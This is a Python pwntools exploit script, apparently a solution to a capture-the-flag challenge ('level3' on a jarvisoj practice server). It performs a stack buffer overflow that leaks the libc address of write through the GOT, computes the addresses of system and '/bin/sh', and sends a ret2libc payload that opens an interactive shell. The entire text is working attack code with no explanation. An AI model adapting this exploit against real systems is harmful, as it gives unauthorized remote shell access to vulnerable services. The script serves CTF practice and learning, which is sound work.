from pwn import *

#context.log_level = 'debug'

#r = process("./level3")
r = remote('pwn2.jarvisoj.com', 9879)
elf = ELF("./level3")
libc = ELF("libc-2.19.so")


write_got = elf.got["write"] 
write_plt = elf.plt["write"]
main = elf.symbols["main"]


r.recvuntil("Input:\n")
pay = 'a' * (0x88 + 4) + p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)
r.sendline(pay)
x = u32(r.recv(4))
print hex(x)


write_libc = libc.symbols['write']
libc_add = x - write_libc
sys_add = libc.symbols['system'] + libc_add
bin_add = 0x00162D4C + libc_add

r.recvuntil("Input:\n")
pay2 = 'a' * (0x88 + 4) + p32(sys_add) + 'aaaa' + p32(bin_add)
r.sendline(pay2)


r.interactive()
